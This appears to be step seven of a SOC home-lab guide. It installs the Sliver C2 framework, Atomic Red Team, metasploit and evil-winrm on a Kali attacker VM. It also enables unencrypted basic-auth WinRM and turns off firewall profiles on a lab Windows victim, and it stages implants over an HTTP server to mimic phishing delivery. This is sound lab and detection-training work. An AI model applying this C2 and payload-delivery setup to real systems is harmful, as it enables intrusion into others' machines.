# Step 7: Kali Attacker Setup

Set up `kali-attacker` (192.168.64.30) with Sliver C2, Atomic Red Team dependencies, and supporting offensive tools.

**Run all commands on kali-attacker via SSH or its console:**
```bash
# [host]
ssh kali@192.168.64.30
```

**Estimated time:** 30–45 minutes (most is download/install time)

> **Safety reminder:** All attack tools installed here are for use within the UTM lab network (192.168.64.0/24) only. Verify that Sliver server never binds to `0.0.0.0:443` — it should only bind to `192.168.64.30:443`. This is validated in Step 7.3.

---

## 7.1 — System Update

```bash
# [kali]
sudo apt update && sudo apt full-upgrade -y

# Install base dependencies
sudo apt install -y \
  git curl wget python3 python3-pip \
  nmap hydra enum4linux smbclient \
  impacket-scripts crackmapexec \
  net-tools dnsutils tcpdump wireshark-common

# Verify key tools
nmap --version | head -1
hydra -V 2>&1 | head -1
python3 -c "import impacket; print('impacket', impacket.__version__)"
```

---

## 7.2 — Install Sliver C2 Framework

Use the automated installer from the repo:

```bash
# [kali] Transfer the setup script from host to Kali
# Option A: If you have the repo cloned on Kali
git clone https://github.com/prajoti-rane/soc-home-lab.git ~/soc-home-lab 2>/dev/null || \
  (cd ~/soc-home-lab && git pull)

# Option B: Copy from host to Kali
# Run this on your Mac:
# scp ~/Projects/soc-home-lab/attack-simulation/sliver/setup-sliver.sh kali@192.168.64.30:/tmp/
```

```bash
# [kali] Run the installer script
bash ~/soc-home-lab/attack-simulation/sliver/setup-sliver.sh
```

The script:
1. Downloads `sliver-server` and `sliver-client` for Linux ARM64
2. Places binaries in `/usr/local/bin/`
3. Creates a systemd service for the server
4. Runs `sliver-server unpack --force` to initialize PKI certificates
5. Prints a summary of next steps

Alternatively, install manually:

```bash
# [kali] Manual Sliver install — adjust version to latest release
SLIVER_VERSION="1.5.42"
ARCH=$(uname -m | sed 's/aarch64/arm64/')

# Download server and client
sudo curl -sL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-server_linux-${ARCH}" \
  -o /usr/local/bin/sliver-server
sudo curl -sL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-client_linux-${ARCH}" \
  -o /usr/local/bin/sliver

sudo chmod +x /usr/local/bin/sliver-server /usr/local/bin/sliver

# Initialize PKI (generates TLS certs for operator authentication)
sudo sliver-server unpack --force
```

### Start Sliver server

```bash
# [kali] Start as background daemon
sudo sliver-server daemon &
# Wait a few seconds for it to start

# Verify it started
pgrep sliver-server && echo "Sliver server is running"

# Connect client
sliver
# Expected: Sliver prompt appears:
# [*] Loaded 4 aliases from disk
# [*] Loaded 3 extension(s) from disk
# sliver >
```

### Safety check: verify Sliver only listens on lab interface

```bash
# [kali] Run this BEFORE generating any implants
# In a new terminal (Sliver client is running in the foreground)
ss -tlnp | grep sliver
# Expected: shows 192.168.64.30:xxxx  NOT 0.0.0.0:xxxx
# (Sliver's gRPC multiplayer port binds to all interfaces; the C2 listener
#  is created per-job and will bind to the IP you specify)
```

When you start an HTTPS listener in Sliver, always specify the lab IP:

```
# [kali — inside sliver prompt]
sliver > https --lport 443 --lhost 192.168.64.30
```

Never use `--lhost 0.0.0.0` in this lab.

### Exit Sliver for now

```
sliver > exit
```

---

## 7.3 — Install Atomic Red Team Dependencies

ART's PowerShell module runs on Windows. Kali hosts the ART YAML test definitions for reference.

```bash
# [kali] Clone the ART repo to reference technique definitions
mkdir -p ~/tools
git clone https://github.com/redcanaryco/atomic-red-team.git ~/tools/atomic-red-team
# This is ~1 GB — takes 2–5 minutes

# Verify
ls ~/tools/atomic-red-team/atomics/T1003.001/
# Expected: T1003.001.md  T1003.001.yaml  src/
```

On the **Windows VM**, install the ART PowerShell module (run this in Step 8 before simulations, or now):

```powershell
# [windows] Install Invoke-AtomicRedTeam
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force -AllowClobber
Install-Module -Name powershell-yaml -Scope CurrentUser -Force

# Verify
Import-Module invoke-atomicredteam
Invoke-AtomicTest T1059.001 -ShowDetails
# Expected: Shows technique details without executing
```

---

## 7.4 — Install Additional Attack Tools

```bash
# [kali] Tools used in attack scenarios
sudo apt install -y \
  metasploit-framework \
  gobuster \
  enum4linux-ng \
  netcat-traditional \
  evil-winrm

# Verify evil-winrm (Ruby gem)
evil-winrm --version 2>/dev/null || sudo gem install evil-winrm

# Install Python-based tools
pip3 install impacket --upgrade 2>/dev/null || true
```

---

## 7.5 — Enable WinRM on victim-windows (Required for Remote ART Execution)

Some attack techniques use WinRM for remote code execution from Kali. Enable it on Windows:

```powershell
# [windows] Run as Administrator
Enable-PSRemoting -Force
winrm quickconfig -quiet

# Allow basic auth (needed for non-domain lab)
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'

# Add Kali as trusted host
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.64.30" -Force

# Open Windows Firewall port 5985
New-NetFirewallRule -DisplayName "WinRM HTTP" -Protocol TCP -LocalPort 5985 -Direction Inbound -Action Allow

# Verify
Test-WSMan -ComputerName localhost
# Expected: Returns XML with wsmid information
```

Test from Kali:

```bash
# [kali]
curl -s -u socadmin:YOUR_PASSWORD "http://192.168.64.20:5985/wsman" -d "" | head -20
# Expected: XML response with ResourceURI

# Or test with evil-winrm
evil-winrm -i 192.168.64.20 -u socadmin -p 'YOUR_PASSWORD'
# Expected: Evil-WinRM shell prompt
# Type: exit
```

---

## 7.6 — Set Up Shared Directory (File Transfer Between Kali and Windows)

For transferring payloads without the Sliver C2 channel:

```bash
# [kali] Start a one-time Python HTTP server from the tools directory
mkdir -p ~/lab-payloads
cd ~/lab-payloads
python3 -m http.server 8080
# Leave this running in a background terminal during attack simulations
```

```powershell
# [windows] Download from Kali's HTTP server
Invoke-WebRequest -Uri http://192.168.64.30:8080/filename.exe -OutFile C:\Temp\filename.exe
```

This is how implants are "delivered" during attack scenarios — simulating a phishing download.

---

## 7.7 — Tool Verification

Run a quick sanity check on all installed tools:

```bash
# [kali]
echo "=== Sliver ==="
which sliver-server && sliver-server --version 2>/dev/null || echo "MISSING"

echo "=== nmap ==="
nmap --version | head -1

echo "=== hydra ==="
hydra -V 2>&1 | grep "Hydra" | head -1

echo "=== impacket ==="
python3 -c "import impacket; print('impacket', impacket.__version__)"

echo "=== crackmapexec ==="
crackmapexec --version 2>/dev/null || cme --version 2>/dev/null || echo "check: cme or crackmapexec"

echo "=== evil-winrm ==="
evil-winrm --version 2>/dev/null | head -1

echo "=== ART repo ==="
ls ~/tools/atomic-red-team/atomics/ | wc -l
echo "ATT&CK technique directories"
```

Expected: all tools return version numbers, ART shows 300+ technique directories.

---

## 7.8 — Network Reachability Test

Confirm Kali can reach the victim for attack scenarios:

```bash
# [kali] Basic reachability
ping -c 2 192.168.64.20

# Port scan the Windows victim
nmap -sV -p 22,80,135,139,445,3389,5985 192.168.64.20
```

Expected open ports on Windows 11 (default config):
- **135** — RPC Endpoint Mapper (always open)
- **139/445** — SMB (File sharing)
- **3389** — RDP (if enabled in Windows settings)
- **5985** — WinRM HTTP (after Step 7.5)

If ports are closed, check Windows Defender Firewall settings on victim-windows.

---

## Troubleshooting

**`sliver-server unpack` fails: "permission denied"**
```bash
# [kali] Binary needs execute permission
sudo chmod +x /usr/local/bin/sliver-server /usr/local/bin/sliver
# Then retry
```

**`sliver` prompt never appears after `sliver-server daemon`**
```bash
# [kali] Check if server is running
pgrep -la sliver
# If not running:
sudo sliver-server daemon 2>&1 &
sleep 3
sliver
```

**`apt install evil-winrm` fails — package not found**
```bash
# [kali] evil-winrm is a Ruby gem, not an apt package
sudo apt install -y ruby ruby-dev
sudo gem install evil-winrm
```

**WinRM test from Kali fails: "Connection refused :5985"**
1. Verify you ran `Enable-PSRemoting` on Windows as Administrator
2. Check Windows Firewall: `Get-NetFirewallRule -DisplayName "WinRM*" | Select-Object DisplayName, Enabled`
3. Verify WinRM service: `Get-Service winrm`

**`nmap` scan shows all ports filtered**
Windows Defender Firewall blocks inbound port scans by default. For the lab, temporarily allow ICMP and disable the public profile firewall on Windows:
```powershell
# [windows — lab only]
Set-NetFirewallProfile -Profile Public -Enabled False
# Re-enable after testing: Set-NetFirewallProfile -Profile Public -Enabled True
```

---

## Checklist — Step 7 Complete When:

- [ ] `sliver-server --version` works on kali
- [ ] `sliver` connects to the server (shows `sliver >` prompt)
- [ ] `nmap -p 445 192.168.64.20` shows port 445 open
- [ ] `~/tools/atomic-red-team/atomics/` directory exists with technique folders
- [ ] WinRM port 5985 open on victim (Test-NetConnection from victim-windows)
- [ ] evil-winrm connects to victim-windows (exits cleanly)

**Next step → [08-attack-simulation.md](08-attack-simulation.md)**
